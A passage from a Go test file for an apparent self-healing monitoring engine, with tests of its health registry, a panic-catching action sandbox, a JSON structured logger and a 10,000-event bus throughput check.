	// 13. Check health registry
	dbHealth := eng.HealthRegistry().Get("database")
	if dbHealth == nil || dbHealth.Status != health.StatusUnhealthy {
		t.Error("database should be marked unhealthy")
	}
	t.Logf("  Health: overall=%s", eng.HealthRegistry().OverallStatus())

	t.Log("✅ FULL E2E: Engine → DNA → Healing → Alerts → TimeTravel → Prometheus → Health — ALL WORKING")
}

// ============================================================================
// SANDBOX TESTS — Safe action testing
// ============================================================================

func TestSandbox_CatchesPanic(t *testing.T) {
	sb := sandbox.New()
	result := sb.Test(event.New(event.TypeError, event.SeverityCritical, "crash"),
		func(e *event.Event) error { panic("catastrophic failure") })
	if result.Safe {
		t.Error("panicking action should be unsafe")
	}
	t.Logf("✅ Sandbox caught panic: %s", result.Error)
}

func TestSandbox_MeasuresDuration(t *testing.T) {
	sb := sandbox.New()
	result := sb.Test(event.New(event.TypeError, event.SeverityError, "slow"),
		func(e *event.Event) error { time.Sleep(50 * time.Millisecond); return nil })
	if result.Duration < 50*time.Millisecond {
		t.Error("should measure actual duration")
	}
	t.Logf("✅ Sandbox measured duration: %s", result.Duration)
}

// ============================================================================
// STRUCTURED LOGGING TEST
// ============================================================================

func TestLogger_JSONOutput(t *testing.T) {
	var buf strings.Builder
	l := logger.New(logger.LevelInfo)
	l.SetOutput(&buf)
	l.With("service", "api").With("version", "2.0").Info("server started on port %d", 8080)

	var entry logger.Entry
	json.NewDecoder(strings.NewReader(buf.String())).Decode(&entry)
	if entry.Level != logger.LevelInfo {
		t.Error("wrong level")
	}
	if entry.Message != "server started on port 8080" {
		t.Error("wrong message")
	}
	if entry.Fields["service"] != "api" {
		t.Error("missing field")
	}
	t.Log("✅ Structured logger: JSON output with fields")
}

// ============================================================================
// BUS STRESS — High throughput
// ============================================================================

func TestBus_10KEvents(t *testing.T) {
	b := bus.New()
	var count atomic.Int64
	var wg sync.WaitGroup
	total := 10000
	wg.Add(total)

	b.Subscribe("*", func(e *event.Event) { count.Add(1); wg.Done() })

	for i := 0; i < total; i++ {
		b.Publish(event.New(event.TypeError, event.SeverityError, "throughput"))
	}

	done := make(chan struct{})
	go func() { wg.Wait(); close(done) }()
	select {
	case <-done:
	case <-time.After(10 * time.Second):
		t.Fatalf("timeout: only %d/%d events received", count.Load(), total)
	}
	t.Logf("✅ Bus: processed %d events successfully", count.Load())
}
